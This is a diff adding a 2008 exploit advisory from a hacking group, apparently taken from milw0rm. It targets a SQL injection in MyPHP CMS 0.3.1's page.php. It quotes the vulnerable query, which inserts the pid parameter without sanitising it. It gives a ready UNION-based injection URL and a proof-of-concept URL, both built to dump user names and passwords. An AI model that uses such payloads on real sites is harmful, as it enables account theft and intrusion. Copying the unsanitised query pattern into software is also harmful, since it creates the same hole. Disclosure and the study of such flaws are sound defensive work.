@@ -1,0 +1,64 @@
+===============================================================
+  MyPHP CMS (page.php pid) Remote SQL Injection Vulnerability
+===============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 25 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : MyPHP CMS
+ VERSION     : 0.3.1
+ VENDOR      : N/A
+ DOWNLOAD    : http://downloads.sourceforge.net/myphpcms
+#####################################################
+
+--- Remote SQL Injection ---
+
+** Magic Quote must turn off **
+
+---------------------------------
+ Vulnerable File [page.php?pid=]
+---------------------------------
+
+@Line 
+
+   13:   $psql = "SELECT  * FROM ".$table_prefix."pages WHERE pid='$pid'";
+   14:	 $pprocess = mysql_query ( $psql );
+   15:	 $prow = mysql_fetch_array ( $pprocess );
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[myphpcms_path]/pages.php?pid=-9999'/**/UNION/**/SELECT/**/1,username,3,password,5,6/**/FROM/**/[prefix_users]/**/WHERE/**/uid='1
+
+	This exploit can dump username and password in clear text
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://192.168.24.25/myphpcms/pages.php?pid=-9999'/**/UNION/**/SELECT/**/1,username,3,password,5,6/**/FROM/**/users/**/WHERE/**/uid='1
+
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-25]
